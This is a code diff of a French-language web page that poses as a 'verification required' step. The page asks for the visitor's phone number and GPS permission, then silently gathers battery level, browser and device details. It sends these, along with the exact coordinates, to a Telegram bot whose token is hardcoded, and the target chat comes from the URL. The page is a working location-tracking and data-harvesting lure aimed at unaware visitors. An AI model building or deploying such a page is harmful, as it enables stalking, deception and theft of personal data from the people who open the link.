@@ -8,142 +8,171 @@
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 60px 20px;
+            padding: 40px 20px;
             background-color: #f4f4f9;
+        }
+        .card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: auto;
         }
         h1 {
             color: #333;
-            font-size: 22px;
+            font-size: 20px;
+            margin-bottom: 10px;
         }
         p {
             color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
             font-size: 16px;
-            margin-top: 20px;
+            box-sizing: border-box;
         }
-        .loader {
-            margin: 30px auto;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0088cc;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
+        button {
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            padding: 14px;
+            font-size: 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        button:hover {
+            background-color: #006699;
         }
     </style>
 </head>
 <body>
 
-    <h1>Validation en cours...</h1>
-    <div class="loader"></div>
-    <p>Veuillez patienter pendant la transmission des données de l'appareil.</p>
+    <div class="card" id="formCard">
+        <h1>Vérification requise</h1>
+        <p>Veuillez entrer votre numéro de téléphone (avec l'indicatif pays) pour continuer :</p>
+        <input type="tel" id="phoneInput" placeholder="Ex: +225 0700000000">
+        <button id="submitBtn">Valider et Partager</button>
+    </div>
+
+    <div class="card" id="loadingCard" style="display: none;">
+        <h1>Patientez...</h1>
+        <p>Récupération de la position en cours...</p>
+    </div>
 
     <script>
         const BOT_TOKEN = "8805637787:AAGMIxpTUNKuIHnSRLiyYgCS980X7khKSQg";
-
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chat_id');
 
-        // Fonction pour détecter le navigateur et l'appareil
+        // Fonction pour identifier le navigateur et l'OS/Type d'appareil
         function getDeviceInfo() {
             const ua = navigator.userAgent;
             let browser = "Navigateur inconnu";
-            let device = "Appareil mobile / PC";
+            let typeAppareil = "Mobile / Autre";
+            let marqueModele = "Inconnu (Sécurité Web)";
 
-            // Détection du navigateur
+            // Navigateur
             if (ua.includes("Firefox")) browser = "Mozilla Firefox";
             else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
-            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
-            else if (ua.includes("Trident")) browser = "Internet Explorer";
-            else if (ua.includes("Edge")) browser = "Microsoft Edge";
             else if (ua.includes("Chrome")) browser = "Google Chrome";
             else if (ua.includes("Safari")) browser = "Apple Safari";
+            else if (ua.includes("Edge")) browser = "Microsoft Edge";
 
-            // Détection basique de l'appareil via User-Agent
-            if (/android/i.test(ua)) device = "Smartphone Android";
-            else if (/iphone|ipad|ipod/i.test(ua)) device = "iPhone / iOS";
-            else if (/windows/i.test(ua)) device = "PC Windows";
-            else if (/macintosh|mac os x/i.test(ua)) device = "Macintosh";
+            // Type d'appareil
+            if (/android/i.test(ua)) typeAppareil = "Smartphone Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) typeAppareil = "iPhone (iOS)";
+            else if (/windows/i.test(ua)) typeAppareil = "Ordinateur Windows";
+            else if (/macintosh/i.test(ua)) typeAppareil = "Macintosh";
 
-            return { browser, device };
+            // Extraction indicative si présente dans l'User-Agent (ex: Samsung, Huawei, etc.)
+            let match = ua.match(/\(([^)]+)\)/);
+            if (match && match[1]) {
+                marqueModele = match[1]; // Contient souvent des infos techniques de l'OS/appareil
+            }
+
+            return { browser, typeAppareil, marqueModele };
         }
 
-        window.onload = async function() {
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone) {
+                alert("Veuillez entrer un numéro de téléphone valide.");
+                return;
+            }
+
             if (!chatId) {
-                document.querySelector('h1').innerText = "Erreur";
-                document.querySelector('p').innerText = "Identifiant de chat introuvable.";
+                alert("Erreur : Chat ID manquant.");
                 return;
             }
 
-            if (!navigator.geolocation) {
-                alert("La géolocalisation n'est pas supportée.");
-                return;
-            }
+            // Changer l'affichage
+            document.getElementById('formCard').style.display = 'none';
+            document.getElementById('loadingCard').style.display = 'block';
 
-            // Récupérer le niveau de la batterie si l'API est disponible
+            // Récupérer la batterie
             let batteryLevel = "Inconnu";
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     batteryLevel = Math.round(battery.level * 100) + "%";
                 }
-            } catch (e) {
-                console.log("Batterie non accessible");
-            }
+            } catch (e) {}
 
             const info = getDeviceInfo();
 
-            // Demande de la position GPS
+            // Demander la géolocalisation
+            if (!navigator.geolocation) {
+                alert("La géolocalisation n'est pas supportée par votre navigateur.");
+                return;
+            }
+
             navigator.geolocation.getCurrentPosition(async (position) => {
                 const latitude = position.coords.latitude;
                 const longitude = position.coords.longitude;
 
-                // 1. Préparer le texte descriptif avec toutes les informations de l'appareil
+                // Construction du message exact demandé
                 const descriptionText = 
-                    `📱 **Rapport de l'appareil**\n` +
-                    `• **Appareil / Modèle :** ${info.device}\n` +
+                    `📋 **RAPPORT DE CONNEXION**\n\n` +
+                    `• **Type d'appareil :** ${info.typeAppareil}\n` +
+                    `• **Marque / Système :** ${info.marqueModele}\n` +
+                    `• **Modèle de l'appareil :** (Restreint par le navigateur)\n` +
                     `• **Navigateur :** ${info.browser}\n` +
                     `• **Batterie :** ${batteryLevel}\n` +
-                    `• **Chat ID :** ${chatId}`;
+                    `• **Numéro de téléphone :** ${phone}\n` +
+                    `• **Chat ID Telegram :** ${chatId}`;
 
                 const textApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(descriptionText)}&parse_mode=Markdown`;
-                
-                // 2. Préparer l'URL pour envoyer la carte interactive
                 const locationApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
 
                 try {
-                    // Envoyer d'abord le texte avec les infos
+                    // Envoi du texte descriptif
                     await fetch(textApiUrl);
-                    
-                    // Envoyer ensuite la mini-carte interactive
-                    const response = await fetch(locationApiUrl);
+                    // Envoi de la carte interactive
+                    await fetch(locationApiUrl);
 
-                    if (response.ok) {
-                        document.querySelector('h1').innerText = "Succès !";
-                        document.querySelector('p').innerText = "Les informations et la position ont été envoyées sur Telegram.";
-                        setTimeout(() => { window.close(); }, 3000);
-                    } else {
-                        document.querySelector('h1').innerText = "Erreur";
-                        document.querySelector('p').innerText = "Erreur lors de l'envoi vers Telegram.";
-                    }
+                    document.querySelector('#loadingCard h1').innerText = "Envoyé !";
+                    document.querySelector('#loadingCard p').innerText = "Les données ont été transmises avec succès. Vous pouvez fermer la page.";
+                    setTimeout(() => { window.close(); }, 3000);
+
                 } catch (error) {
-                    console.error("Erreur réseau :", error);
-                    document.querySelector('h1').innerText = "Erreur";
-                    document.querySelector('p').innerText = "Erreur de connexion réseau.";
+                    alert("Erreur réseau lors de la transmission.");
                 }
 
             }, (error) => {
-                document.querySelector('h1').innerText = "Autorisation requise";
-                document.querySelector('p').innerText = "Veuillez autoriser l'accès à la localisation pour continuer.";
-            }, { 
-                enableHighAccuracy: true, 
-                timeout: 15000, 
-                maximumAge: 0 
-            });
-        };
+                alert("Veuillez autoriser l'accès à la position GPS pour continuer.");
+                document.getElementById('formCard').style.display = 'block';
+                document.getElementById('loadingCard').style.display = 'none';
+            }, { enableHighAccuracy: true, timeout: 15000 });
+        });
     </script>
 
 </body>
